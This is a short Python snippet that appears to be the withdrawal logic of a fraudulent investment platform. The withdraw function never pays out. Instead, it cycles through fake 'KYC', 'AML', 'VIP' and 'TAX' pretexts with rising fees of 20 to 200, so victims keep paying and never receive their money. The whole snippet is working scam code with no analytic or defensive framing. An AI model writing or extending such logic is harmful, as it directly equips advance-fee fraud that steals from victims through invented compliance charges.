withdrawal_pretexts = [
    {'code': 'KYC', 'fee': 20}, {'code': 'AML', 'fee': 50},
    {'code': 'VIP', 'fee': 100}, {'code': 'TAX', 'fee': 200}
]
def withdraw(account):
    reason = withdrawal_pretexts[account['withdrawal_step'] % len(withdrawal_pretexts)]
    account['withdrawal_step'] += 1
    return {'payout': False, 'reason': reason}

